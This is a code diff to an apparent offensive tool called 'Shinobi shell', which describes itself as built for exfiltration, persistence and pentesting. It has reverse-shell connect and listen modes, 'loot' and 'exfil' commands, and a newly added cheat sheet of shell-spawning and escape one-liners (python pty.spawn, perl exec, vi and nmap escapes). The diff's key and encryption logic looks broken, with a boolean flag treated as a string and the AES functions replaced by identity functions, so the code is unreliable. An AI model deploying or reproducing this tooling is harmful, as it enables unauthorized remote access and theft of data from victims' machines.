@@ -21,18 +21,22 @@ try:
 except ImportError:
     from pipes import quote
 
-encryptionAvailable = True
+encryptionAvailable = False
 try:
-        from Crypto.Cipher import AES
+	from Crypto.Cipher import AES
+	encryptionAvailable = True
 except ImportError:
-	print("WARNING -> Crypto.Cipher Library not available on this machine.... Your shell will work but there's no encryption...")
 	encryptionAvailable = False
+	print("WARNING -> Crypto.Cipher Library not available on this machine.... Your shell will work but there's no encryption...")
+
 
 parser = argparse.ArgumentParser(description='Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.', prog='PROG', usage='%(prog)s [options]')
 
-parser.add_argument('-a', '--address', help='ip:port - The machine address with a Shinobi Shell listener running')
+parser.add_argument('-t', '--ttyCheat', help='Shows tty shell cheat sheet', action="store_true")
+parser.add_argument('-c',  '--connect', help='Flag that indicates a reverse shell connection', action="store_true")
+#parser.add_argument('-a', '--address', help='ip:port - The machine address with a Shinobi Shell listener running')
 parser.add_argument('-l', '--listen', help='Starts Shinobi Shell listener on port passed in')
-parser.add_argument('-k', '--key', required=True,help='Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients')
+parser.add_argument('-k', '--key', help='Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients', action="store_true")
 parser.add_argument('-r', '--serveraddress', help='Local IP Address used for universal reverse shell handler')
 
 #The Shinobi Shell command prompt
@@ -66,11 +70,17 @@ def lb():
 
 #Runs a shell command
 def runCommand(command):
-	print(os.popen(command).read())
+	print(os.popen(command).read().strip())
 
 try:
-	secret_key = args["key"].strip()
-	secretLength = len(secret_key)
+	
+	if(args["key"]):
+		print('Please enter your secret Key')
+		print("Your secret key must be 16, 24 or 32 chars long")
+		key = raw_input('key: ')
+		secret_key = args["key"].strip()
+		secretLength = len(secret_key)
+
 	is16 = secretLength != 16
 	is24 = secretLength != 24
 	is32 = secretLength != 32
@@ -84,17 +94,24 @@ try:
 	PADDING = '{'
 	BLOCK_SIZE = 32
 	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+	print('Shinobi Tunnel Encrypted')
 except:
+	print('Shinobi Tunnel Plaintext ~~ Be aware')
 	pass
 
-EncodeAES = lambda s: base64.b64encode(cipher.encrypt(pad(s)))
-DecodeAES = lambda e: cipher.decrypt(base64.b64decode(e)).rstrip(PADDING)
+try:
+	EncodeAES = lambda s: base64.b64encode(cipher.encrypt(pad(s)))
+	DecodeAES = lambda e: cipher.decrypt(base64.b64decode(e)).rstrip(PADDING)
+except:
+	pass
+else:
+	EncodeAES = lambda s: s
+	DecodeAES = lambda e: e
 
 #############################
 
 #Sends a command with our custom padding because sockets are to fucking dumb to know when messages begin and end
 def sendCommand(connection,command):
-
 	payload = ""
 
 	if(encryptionAvailable):
@@ -414,6 +431,20 @@ def getLoot(connection, command):
 		else:
 			print("Loot not found!")
 
+def displayPtyCheetSheet():
+	print('TTY Cheet Sheet')
+	print('')
+	print('Python:\t\t\tpython -c \'import pty; pty.spawn("/bin/sh")\'')
+	print('Bash:\t\t\techo os.system(\'/bin/bash\')')
+	print('Sh:\t\t\t/bin/sh -i')
+	print('Perl:\t\t\tperl -e \'exec "/bin/sh":\'')
+	print('Perl:\t\t\texec "/bin/sh";')
+	print('Ruby:\t\t\texec "/bin/sh"')
+	print('Lua:\t\t\tos.execute(\'/bin/sh\')')
+	print('Inside Vi:\t\t!bash')
+	print('Inside Vi:\t\t:set shell=/bin/bash:shell')
+	print('Inside Nmap:\t\t!sh')
+
 #Handles user input
 def handleCommand(connection,command):
 	if(len(command) == 0):
@@ -457,13 +488,10 @@ def handleCommand(connection,command):
 
 #This is the Shinobi Client Shell
 class ShinobiShellPrompt(cmd.Cmd):
-	connectiion = ""
+	connectiion = ""	
 	prompt = CMDPROMPT
 	commands = ["machineinfo","help","searchsploit","ssdownload","download","exfil"]
-
-	def completenames(self, text, *ignored):
-		pass
-
+	
 	def default(self, line):
 		handleCommand(self.connection, line)
 
@@ -474,6 +502,11 @@ class ShinobiShellPrompt(cmd.Cmd):
 		ipAddresses = os.popen("hostname -I").read().strip()
 		metaLine = "###" + currentTime + " | " + hostname + "/" + currentUser + " | " + ipAddresses + " " + "###"
 		print(metaLine)
+		return line
+
+	def postcmd(self, line, arg):
+		currentDir = '[' + os.popen('pwd').read().strip() + ']';
+		print(currentDir)
 		return line
 
 	def emptyline(self):
@@ -679,6 +712,7 @@ def listenerThread(connection, address):
 #Attempts to start a Shinobi Shell listener on the port passed in
 def setupShinobiShellListener(port):
 	print('Listening for Shinobi Shell connections on port ' + port)
+	print('Send me Ninja Connections!')
 
 	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	serversocket.bind(('0.0.0.0', int(port)))
@@ -691,8 +725,9 @@ def setupShinobiShellListener(port):
 if(args["serveraddress"]):
 	serverAddress = args["serveraddress"]
 
-if(args["address"]):
-	connectToShinobiShellServer(args["address"])
+if(args["connect"]):
+	serveraddr = raw_input('Enter Server Address and port ~> example: 127.0.0.1:8080 : ')
+	connectToShinobiShellServer(serveraddr)
 
 if(args["listen"]):
 	print("Looking for stored loot file in working directory..")
@@ -707,3 +742,6 @@ if(args["listen"]):
 		print("No loot chest cache found. Creating new chest")
 
 	setupShinobiShellListener(args["listen"])
+
+if(args["ttyCheat"]):
+	displayPtyCheetSheet()
